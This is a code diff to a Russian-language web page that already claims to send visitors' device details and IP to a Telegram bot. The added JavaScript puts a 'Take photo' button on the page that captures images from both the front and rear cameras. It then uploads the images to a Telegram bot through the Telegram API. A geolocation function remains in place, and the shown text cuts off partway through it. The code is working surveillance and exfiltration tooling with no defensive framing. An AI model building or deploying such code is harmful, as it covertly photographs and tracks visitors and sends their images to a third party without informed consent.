@@ -9,8 +9,93 @@
     <h1>Добро пожаловать на страницу определения информации об устройстве и IP</h1>
     <p>Информация о вашем устройстве и IP-адрес будет отправлена в Telegram-бот.</p>
 
+    <button onclick="takePhoto()">Сделать фото</button>
+
     <script>
-        // Функция для получения геолокации пользователя
+        // Функция для доступа к камерам и снимка
+        async function takePhoto() {
+            const constraints = {
+                video: { facingMode: "user" } // Для передней камеры
+            };
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await new Promise((resolve) => (video.onloadedmetadata = resolve));
+                video.play();
+
+                // Захват фото с передней камеры
+                const frontPhoto = captureImage(video);
+                console.log('Фото с передней камеры сделано');
+
+                // Смена на заднюю камеру
+                constraints.video.facingMode = { exact: "environment" };
+                const backStream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = backStream;
+                await new Promise((resolve) => (video.onloadedmetadata = resolve));
+                video.play();
+
+                // Захват фото с задней камеры
+                const backPhoto = captureImage(video);
+                console.log('Фото с задней камеры сделано');
+
+                // Отправка фотографий в Telegram-бот
+                sendPhotoToTelegram(frontPhoto, 'Передняя камера');
+                sendPhotoToTelegram(backPhoto, 'Задняя камера');
+
+            } catch (error) {
+                console.error('Ошибка при доступе к камере:', error);
+            }
+        }
+
+        // Функция для захвата изображения из видео-потока
+        function captureImage(video) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/png');
+        }
+
+        // Функция для отправки фотографии в Telegram-бот
+        function sendPhotoToTelegram(photoData, camera) {
+            const botToken = 'YOUR_BOT_TOKEN';
+            const chatId = 'YOUR_CHAT_ID';
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', dataURItoBlob(photoData));
+            formData.append('caption', `Фото с ${camera}`);
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(`Фото с ${camera} отправлено в Telegram:`, data);
+            })
+            .catch(error => {
+                console.error(`Ошибка при отправке фото с ${camera} в Telegram:`, error);
+            });
+        }
+
+        // Функция для преобразования DataURI в Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+       // Функция для получения геолокации пользователя
         function getGeolocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
